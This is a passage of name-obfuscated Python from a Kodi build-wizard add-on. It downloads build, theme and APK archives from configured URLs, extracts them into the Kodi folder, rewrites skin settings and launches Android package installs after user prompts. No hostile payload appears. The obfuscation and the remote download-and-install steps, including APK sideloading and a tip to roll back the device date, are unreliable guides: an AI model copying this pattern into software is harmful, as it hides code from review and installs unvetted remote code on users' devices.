			if not wiz .workingURL (O000OOO000OO0O00O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3780
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3781
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OO0O0O0O00O0OO ,wiz .checkBuild (OO0OO0O0O0O00O0OO ,'version')),'','אנא המתן')#line:3782
			O0000O000O000O0OO =os .path .join (PACKAGES ,'%s.zip'%O0OOOO0O000OOOO0O )#line:3783
			try :os .remove (O0000O000O000O0OO )#line:3784
			except :pass #line:3785
			logging .warning (O000OOO000OO0O00O )#line:3786
			if 'google'in O000OOO000OO0O00O :#line:3787
			   O000O00O0OOO00000 =googledrive_download (O000OOO000OO0O00O ,O0000O000O000O0OO ,DP ,wiz .checkBuild (OO0OO0O0O0O00O0OO ,'filesize'))#line:3788
			else :#line:3791
			  downloader .download (O000OOO000OO0O00O ,O0000O000O000O0OO ,DP )#line:3792
			xbmc .sleep (1000 )#line:3793
			O00OOOO00000OOOOO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OO0O0O0O00O0OO ,wiz .checkBuild (OO0OO0O0O0O00O0OO ,'version'))#line:3794
			DP .update (0 ,O00OOOO00000OOOOO ,'','Please Wait')#line:3795
			O00O00OOO00O00OO0 ,O00000OO000OOO00O ,O00OOO0O0OOOOOO00 =extract .all (O0000O000O000O0OO ,HOME ,DP ,title =O00OOOO00000OOOOO )#line:3796
			if int (float (O00O00OOO00O00OO0 ))>0 :#line:3797
				wiz .fixmetas ()#line:3798
				wiz .lookandFeelData ('save')#line:3799
				wiz .defaultSkin ()#line:3800
				wiz .setS ('buildname',OO0OO0O0O0O00O0OO )#line:3802
				wiz .setS ('buildversion',wiz .checkBuild (OO0OO0O0O0O00O0OO ,'version'))#line:3803
				wiz .setS ('buildtheme','')#line:3804
				wiz .setS ('latestversion',wiz .checkBuild (OO0OO0O0O0O00O0OO ,'version'))#line:3805
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:3806
				wiz .setS ('installed','true')#line:3807
				wiz .setS ('extract',str (O00O00OOO00O00OO0 ))#line:3808
				wiz .setS ('errors',str (O00000OO000OOO00O ))#line:3809
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O00O00OOO00O00OO0 ,O00000OO000OOO00O ))#line:3810
				O0OOO00O00OOOOO0O =(ADDON .getSetting ("gaiaseren"))#line:3812
				if O0OOO00O00OOOOO0O =='true':#line:3813
					wiz .kodi17Fix ()#line:3814
				fastupdatefirstbuild (NOTEID )#line:3815
				skin_homeselect ()#line:3816
				skin_lower ()#line:3817
				rdbuildinstall ()#line:3818
				try :gaiaserenaddon ()#line:3820
				except :pass #line:3821
				adults18 ()#line:3822
				skinfix18 ()#line:3823
				try :os .remove (O0000O000O000O0OO )#line:3825
				except :pass #line:3826
				if O0OOO00O00OOOOO0O =='true':#line:3828
					wiz .kodi17Fix ()#line:3829
				if int (float (O00000OO000OOO00O ))>0 :#line:3831
					OOO0000OO0000OO00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OO0O0O0O00O0OO ,wiz .checkBuild (OO0OO0O0O0O00O0OO ,'version')),'הושלם: [COLOR %s]%s%s[/COLOR] [שגיאות:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O00O00OOO00O00OO0 ,'%',COLOR1 ,O00000OO000OOO00O ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:3832
					if OOO0000OO0000OO00 :#line:3833
						if isinstance (O00000OO000OOO00O ,unicode ):#line:3834
							O00OOO0O0OOOOOO00 =O00OOO0O0OOOOOO00 .encode ('utf-8')#line:3835
						wiz .TextBox (ADDONTITLE ,O00OOO0O0OOOOOO00 )#line:3836
				DP .close ()#line:3837
				O00O00OO0OO0000O0 =wiz .themeCount (OO0OO0O0O0O00O0OO )#line:3838
				indicator ()#line:3839
				if not O00O00OO0OO0000O0 ==False :#line:3840
					buildWizard (OO0OO0O0O0O00O0OO ,'theme')#line:3841
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:3842
				if INSTALLMETHOD ==1 :OO00O000OO00OOO0O =1 #line:3843
				elif INSTALLMETHOD ==2 :OO00O000OO00OOO0O =0 #line:3844
				else :resetkodi ()#line:3845
				if OO00O000OO00OOO0O ==1 :wiz .reloadFix ()#line:3847
				else :wiz .killxbmc (True )#line:3848
			else :#line:3849
				if isinstance (O00000OO000OOO00O ,unicode ):#line:3850
					O00OOO0O0OOOOOO00 =O00OOO0O0OOOOOO00 .encode ('utf-8')#line:3851
				O00O00OOOOOO00O0O =open (O0000O000O000O0OO ,'r')#line:3852
				O0OO00OO0OO0OOO0O =O00O00OOOOOO00O0O .read ()#line:3853
				OO00000000OO0O00O =''#line:3854
				for OO0OO00OOO00O0OO0 in O000O00O0OOO00000 :#line:3855
				  OO00000000OO0O00O ='key: '+OO00000000OO0O00O +'\n'+OO0OO00OOO00O0OO0 #line:3856
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,O00OOO0O0OOOOOO00 +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+OO00000000OO0O00O )#line:3857
		else :#line:3858
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:3859
	elif O000OOO00O000O0OO =='theme':#line:3860
		if theme ==None :#line:3861
			O00O00OO0OO0000O0 =wiz .checkBuild (OO0OO0O0O0O00O0OO ,'theme')#line:3862
			O00O0O00O0OO0OO00 =[]#line:3863
			if not O00O00OO0OO0000O0 =='http://'and wiz .workingURL (O00O00OO0OO0000O0 )==True :#line:3864
				O00O0O00O0OO0OO00 =wiz .themeCount (OO0OO0O0O0O00O0OO ,False )#line:3865
				if len (O00O0O00O0OO0OO00 )>0 :#line:3866
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,OO0OO0O0O0O00O0OO ,COLOR1 ,len (O00O0O00O0OO0OO00 )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:3867
						wiz .log ("Theme List: %s "%str (O00O0O00O0OO0OO00 ))#line:3868
						OOOO00OOO0OO0OOO0 =DIALOG .select (ADDONTITLE ,O00O0O00O0OO0OO00 )#line:3869
						wiz .log ("Theme install selected: %s"%OOOO00OOO0OO0OOO0 )#line:3870
						if not OOOO00OOO0OO0OOO0 ==-1 :theme =O00O0O00O0OO0OO00 [OOOO00OOO0OO0OOO0 ];OO0OOO0O00OO0OO0O =True #line:3871
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:3872
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:3873
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:3874
		else :OO0OOO0O00OO0OO0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,OO0OO0O0O0O00O0OO ,wiz .checkBuild (OO0OO0O0O0O00O0OO ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:3875
		if OO0OOO0O00OO0OO0O :#line:3876
			OO00OOOO000OOO000 =wiz .checkTheme (OO0OO0O0O0O00O0OO ,theme ,'url')#line:3877
			O0OOOO0O000OOOO0O =OO0OO0O0O0O00O0OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3878
			if not wiz .workingURL (OO00OOOO000OOO000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:3879
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3880
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:3881
			O0000O000O000O0OO =os .path .join (PACKAGES ,'%s.zip'%O0OOOO0O000OOOO0O )#line:3882
			try :os .remove (O0000O000O000O0OO )#line:3883
			except :pass #line:3884
			downloader .download (OO00OOOO000OOO000 ,O0000O000O000O0OO ,DP )#line:3885
			xbmc .sleep (1000 )#line:3886
			DP .update (0 ,"","Installing %s "%OO0OO0O0O0O00O0OO )#line:3887
			OOO0000000OO00OO0 =False #line:3888
			if url not in ["fresh","normal"]:#line:3889
				OOO0000000OO00OO0 =testTheme (O0000O000O000O0OO )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:3890
				O0000O0OOO0OOO000 =testGui (O0000O000O000O0OO )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:3891
				if OOO0000000OO00OO0 ==True :#line:3892
					wiz .lookandFeelData ('save')#line:3893
					O00OO0OO00OO00000 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:3894
					O000O0000OOO00O00 =xbmc .getSkinDir ()#line:3895
					skinSwitch .swapSkins (O00OO0OO00OO00000 )#line:3897
					O00000O0O0O00O0OO =0 #line:3898
					xbmc .sleep (1000 )#line:3899
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00000O0O0O00O0OO <150 :#line:3900
						O00000O0O0O00O0OO +=1 #line:3901
						xbmc .sleep (1000 )#line:3902
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3903
						wiz .ebi ('SendClick(11)')#line:3904
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:3905
					xbmc .sleep (1000 )#line:3906
			O00OOOO00000OOOOO ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:3907
			DP .update (0 ,O00OOOO00000OOOOO ,'','אנא המתן')#line:3908
			O00O00OOO00O00OO0 ,O00000OO000OOO00O ,O00OOO0O0OOOOOO00 =extract .all (O0000O000O000O0OO ,HOME ,DP ,title =O00OOOO00000OOOOO )#line:3909
			wiz .setS ('buildtheme',theme )#line:3910
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(O00O00OOO00O00OO0 ,O00000OO000OOO00O ))#line:3911
			DP .close ()#line:3912
			if url not in ["fresh","normal"]:#line:3913
				wiz .forceUpdate ()#line:3914
				if KODIV >=17 :wiz .kodi17Fix ()#line:3915
				if O0000O0OOO0OOO000 ==True :#line:3916
					wiz .lookandFeelData ('save')#line:3917
					wiz .defaultSkin ()#line:3918
					O000O0000OOO00O00 =wiz .getS ('defaultskin')#line:3919
					skinSwitch .swapSkins (O000O0000OOO00O00 )#line:3920
					O00000O0O0O00O0OO =0 #line:3921
					xbmc .sleep (1000 )#line:3922
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00000O0O0O00O0OO <150 :#line:3923
						O00000O0O0O00O0OO +=1 #line:3924
						xbmc .sleep (1000 )#line:3925
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3927
						wiz .ebi ('SendClick(11)')#line:3928
					wiz .lookandFeelData ('restore')#line:3929
				elif OOO0000000OO00OO0 ==True :#line:3930
					skinSwitch .swapSkins (O000O0000OOO00O00 )#line:3931
					O00000O0O0O00O0OO =0 #line:3932
					xbmc .sleep (1000 )#line:3933
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00000O0O0O00O0OO <150 :#line:3934
						O00000O0O0O00O0OO +=1 #line:3935
						xbmc .sleep (1000 )#line:3936
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3938
						wiz .ebi ('SendClick(11)')#line:3939
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:3940
					wiz .lookandFeelData ('restore')#line:3941
				else :#line:3942
					wiz .ebi ("ReloadSkin()")#line:3943
					xbmc .sleep (1000 )#line:3944
					wiz .ebi ("Container.Refresh")#line:3945
		else :#line:3946
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:3947
def skin_homeselect ():#line:3951
	try :#line:3953
		O00O0O0OOO000O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3954
		OOO0000O0O0000OOO =open (O00O0O0OOO000O000 ,'r')#line:3956
		OOO0O0O0OOOO00OO0 =OOO0000O0O0000OOO .read ()#line:3957
		OOO0000O0O0000OOO .close ()#line:3958
		OOO0OOO00OOO0O0O0 ='<setting id="HomeS" type="string(.+?)/setting>'#line:3959
		O00OO0O00O000OO0O =re .compile (OOO0OOO00OOO0O0O0 ).findall (OOO0O0O0OOOO00OO0 )[0 ]#line:3960
		OOO0000O0O0000OOO =open (O00O0O0OOO000O000 ,'w')#line:3961
		OOO0000O0O0000OOO .write (OOO0O0O0OOOO00OO0 .replace ('<setting id="HomeS" type="string%s/setting>'%O00OO0O00O000OO0O ,'<setting id="HomeS" type="string"></setting>'))#line:3962
		OOO0000O0O0000OOO .close ()#line:3963
	except :#line:3964
		pass #line:3965
def skin_lower ():#line:3968
	OOOOO0OO000O0000O =(ADDON .getSetting ("lower"))#line:3969
	if OOOOO0OO000O0000O =='true':#line:3970
		try :#line:3973
			O0O00OOOO0000OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3974
			O000000OOOO00OO0O =open (O0O00OOOO0000OO00 ,'r')#line:3976
			OO0OO0OO00OO00O0O =O000000OOOO00OO0O .read ()#line:3977
			O000000OOOO00OO0O .close ()#line:3978
			O00000O0OO0O0O0OO ='<setting id="none_widget" type="bool(.+?)/setting>'#line:3979
			O00OOOOOO0OO0OOOO =re .compile (O00000O0OO0O0O0OO ).findall (OO0OO0OO00OO00O0O )[0 ]#line:3980
			O000000OOOO00OO0O =open (O0O00OOOO0000OO00 ,'w')#line:3981
			O000000OOOO00OO0O .write (OO0OO0OO00OO00O0O .replace ('<setting id="none_widget" type="bool%s/setting>'%O00OOOOOO0OO0OOOO ,'<setting id="none_widget" type="bool">true</setting>'))#line:3982
			O000000OOOO00OO0O .close ()#line:3983
			O0O00OOOO0000OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3985
			O000000OOOO00OO0O =open (O0O00OOOO0000OO00 ,'r')#line:3987
			OO0OO0OO00OO00O0O =O000000OOOO00OO0O .read ()#line:3988
			O000000OOOO00OO0O .close ()#line:3989
			O00000O0OO0O0O0OO ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:3990
			O00OOOOOO0OO0OOOO =re .compile (O00000O0OO0O0O0OO ).findall (OO0OO0OO00OO00O0O )[0 ]#line:3991
			O000000OOOO00OO0O =open (O0O00OOOO0000OO00 ,'w')#line:3992
			O000000OOOO00OO0O .write (OO0OO0OO00OO00O0O .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%O00OOOOOO0OO0OOOO ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:3993
			O000000OOOO00OO0O .close ()#line:3994
			O0O00OOOO0000OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3996
			O000000OOOO00OO0O =open (O0O00OOOO0000OO00 ,'r')#line:3998
			OO0OO0OO00OO00O0O =O000000OOOO00OO0O .read ()#line:3999
			O000000OOOO00OO0O .close ()#line:4000
			O00000O0OO0O0O0OO ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4001
			O00OOOOOO0OO0OOOO =re .compile (O00000O0OO0O0O0OO ).findall (OO0OO0OO00OO00O0O )[0 ]#line:4002
			O000000OOOO00OO0O =open (O0O00OOOO0000OO00 ,'w')#line:4003
			O000000OOOO00OO0O .write (OO0OO0OO00OO00O0O .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%O00OOOOOO0OO0OOOO ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4004
			O000000OOOO00OO0O .close ()#line:4005
			O0O00OOOO0000OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4009
			O000000OOOO00OO0O =open (O0O00OOOO0000OO00 ,'r')#line:4011
			OO0OO0OO00OO00O0O =O000000OOOO00OO0O .read ()#line:4012
			O000000OOOO00OO0O .close ()#line:4013
			O00000O0OO0O0O0OO ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4014
			O00OOOOOO0OO0OOOO =re .compile (O00000O0OO0O0O0OO ).findall (OO0OO0OO00OO00O0O )[0 ]#line:4015
			O000000OOOO00OO0O =open (O0O00OOOO0000OO00 ,'w')#line:4016
			O000000OOOO00OO0O .write (OO0OO0OO00OO00O0O .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%O00OOOOOO0OO0OOOO ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4017
			O000000OOOO00OO0O .close ()#line:4018
			O0O00OOOO0000OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4022
			O000000OOOO00OO0O =open (O0O00OOOO0000OO00 ,'r')#line:4024
			OO0OO0OO00OO00O0O =O000000OOOO00OO0O .read ()#line:4025
			O000000OOOO00OO0O .close ()#line:4026
			O00000O0OO0O0O0OO ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4027
			O00OOOOOO0OO0OOOO =re .compile (O00000O0OO0O0O0OO ).findall (OO0OO0OO00OO00O0O )[0 ]#line:4028
			O000000OOOO00OO0O =open (O0O00OOOO0000OO00 ,'w')#line:4029
			O000000OOOO00OO0O .write (OO0OO0OO00OO00O0O .replace ('<setting id="show.cdart" type="bool%s/setting>'%O00OOOOOO0OO0OOOO ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4030
			O000000OOOO00OO0O .close ()#line:4031
			O0O00OOOO0000OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4035
			O000000OOOO00OO0O =open (O0O00OOOO0000OO00 ,'r')#line:4037
			OO0OO0OO00OO00O0O =O000000OOOO00OO0O .read ()#line:4038
			O000000OOOO00OO0O .close ()#line:4039
			O00000O0OO0O0O0OO ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4040
			O00OOOOOO0OO0OOOO =re .compile (O00000O0OO0O0O0OO ).findall (OO0OO0OO00OO00O0O )[0 ]#line:4041
			O000000OOOO00OO0O =open (O0O00OOOO0000OO00 ,'w')#line:4042
			O000000OOOO00OO0O .write (OO0OO0OO00OO00O0O .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%O00OOOOOO0OO0OOOO ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4043
			O000000OOOO00OO0O .close ()#line:4044
		except :#line:4049
			pass #line:4050
def thirdPartyInstall (OOOO00OO000OOOOOO ,O0OO0OO00O0O0OO0O ):#line:4052
	if not wiz .workingURL (O0OO0OO00O0O0OO0O ):#line:4053
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4054
	O0O00O0O00OOO0OO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO00OO000OOOOOO ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4055
	if O0O00O0O00OOO0OO0 ==1 :#line:4056
		freshStart ('third',True )#line:4057
	wiz .clearS ('build')#line:4058
	OOOOO0OO0OOOOOO00 =OOOO00OO000OOOOOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4059
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4060
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO00OO000OOOOOO ),'','אנא המתן')#line:4061
	O00OO0000O0OO00O0 =os .path .join (PACKAGES ,'%s.zip'%OOOOO0OO0OOOOOO00 )#line:4062
	try :os .remove (O00OO0000O0OO00O0 )#line:4063
	except :pass #line:4064
	downloader .download (O0OO0OO00O0O0OO0O ,O00OO0000O0OO00O0 ,DP )#line:4065
	xbmc .sleep (1000 )#line:4066
	O0O0OOOO00O00O0O0 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO00OO000OOOOOO )#line:4067
	DP .update (0 ,O0O0OOOO00O00O0O0 ,'','אנא המתן')#line:4068
	OO0000OO0O00O00O0 ,O0OOO0O0000O00OOO ,O0OOOO000O0OOOO0O =extract .all (O00OO0000O0OO00O0 ,HOME ,DP ,title =O0O0OOOO00O00O0O0 )#line:4069
	if int (float (OO0000OO0O00O00O0 ))>0 :#line:4070
		wiz .fixmetas ()#line:4071
		wiz .lookandFeelData ('save')#line:4072
		wiz .defaultSkin ()#line:4073
		wiz .setS ('installed','true')#line:4075
		wiz .setS ('extract',str (OO0000OO0O00O00O0 ))#line:4076
		wiz .setS ('errors',str (O0OOO0O0000O00OOO ))#line:4077
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OO0000OO0O00O00O0 ,O0OOO0O0000O00OOO ))#line:4078
		try :os .remove (O00OO0000O0OO00O0 )#line:4079
		except :pass #line:4080
		if int (float (O0OOO0O0000O00OOO ))>0 :#line:4081
			O0OO0OO0O0OOOOOOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO00OO000OOOOOO ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OO0000OO0O00O00O0 ,'%',COLOR1 ,O0OOO0O0000O00OOO ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4082
			if O0OO0OO0O0OOOOOOO :#line:4083
				if isinstance (O0OOO0O0000O00OOO ,unicode ):#line:4084
					O0OOOO000O0OOOO0O =O0OOOO000O0OOOO0O .encode ('utf-8')#line:4085
				wiz .TextBox (ADDONTITLE ,O0OOOO000O0OOOO0O )#line:4086
	DP .close ()#line:4087
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4088
	if INSTALLMETHOD ==1 :O000000O000O00O00 =1 #line:4089
	elif INSTALLMETHOD ==2 :O000000O000O00O00 =0 #line:4090
	else :O000000O000O00O00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4091
	if O000000O000O00O00 ==1 :wiz .reloadFix ()#line:4092
	else :wiz .killxbmc (True )#line:4093
def testTheme (O000OOOO0O000O0OO ):#line:4095
	O0000OOOO0000000O =zipfile .ZipFile (O000OOOO0O000O0OO )#line:4096
	for O00O0OO0O0O0OO000 in O0000OOOO0000000O .infolist ():#line:4097
		if '/settings.xml'in O00O0OO0O0O0OO000 .filename :#line:4098
			return True #line:4099
	return False #line:4100
def testGui (OOO0000OO00OOOOOO ):#line:4102
	O0O0O0O00OO0000O0 =zipfile .ZipFile (OOO0000OO00OOOOOO )#line:4103
	for OOOOO00O00O00000O in O0O0O0O00OO0000O0 .infolist ():#line:4104
		if '/guisettings.xml'in OOOOO00O00O00000O .filename :#line:4105
			return True #line:4106
	return False #line:4107
def apkInstaller (O00OOO000O00OOO0O ,OOOOO00O0OO0OO0O0 ):#line:4109
	wiz .log (O00OOO000O00OOO0O )#line:4110
	wiz .log (OOOOO00O0OO0OO0O0 )#line:4111
	if wiz .platform ()=='android':#line:4112
		O00O0O000OO0O0000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OOO000O00OOO0O ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4113
		if not O00O0O000OO0O0000 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4114
		O0O00O00OOOO00O0O =O00OOO000O00OOO0O #line:4115
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4116
		if not wiz .workingURL (OOOOO00O0OO0OO0O0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4117
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O00O00OOOO00O0O ),'','אנא המתן')#line:4118
		OO0OOO00000000000 =os .path .join (PACKAGES ,"%s.apk"%O00OOO000O00OOO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4119
		try :os .remove (OO0OOO00000000000 )#line:4120
		except :pass #line:4121
		downloader .download (OOOOO00O0OO0OO0O0 ,OO0OOO00000000000 ,DP )#line:4122
		xbmc .sleep (100 )#line:4123
		DP .close ()#line:4124
		notify .apkInstaller (O00OOO000O00OOO0O )#line:4125
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+OO0OOO00000000000 +'")')#line:4126
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4127
def createMenu (O0000OO0OO00OOO0O ,OOO0OO0OOO0OOOO0O ,OOO00OO00000O00O0 ):#line:4133
	if O0000OO0OO00OOO0O =='saveaddon':#line:4134
		OO0O0O000000O00O0 =[]#line:4135
		O0O00OOOOO0OOO00O =urllib .quote_plus (OOO0OO0OOO0OOOO0O .lower ().replace (' ',''))#line:4136
		O0OOO00OOOO0O00OO =OOO0OO0OOO0OOOO0O .replace ('Debrid','Real Debrid')#line:4137
		O000OO00OOOOOO0OO =urllib .quote_plus (OOO00OO00000O00O0 .lower ().replace (' ',''))#line:4138
		OOO00OO00000O00O0 =OOO00OO00000O00O0 .replace ('url','URL Resolver')#line:4139
		OO0O0O000000O00O0 .append ((THEME2 %OOO00OO00000O00O0 .title (),' '))#line:4140
		OO0O0O000000O00O0 .append ((THEME3 %'Save %s Data'%O0OOO00OOOO0O00OO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0O00OOOOO0OOO00O ,O000OO00OOOOOO0OO )))#line:4141
		OO0O0O000000O00O0 .append ((THEME3 %'Restore %s Data'%O0OOO00OOOO0O00OO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0O00OOOOO0OOO00O ,O000OO00OOOOOO0OO )))#line:4142
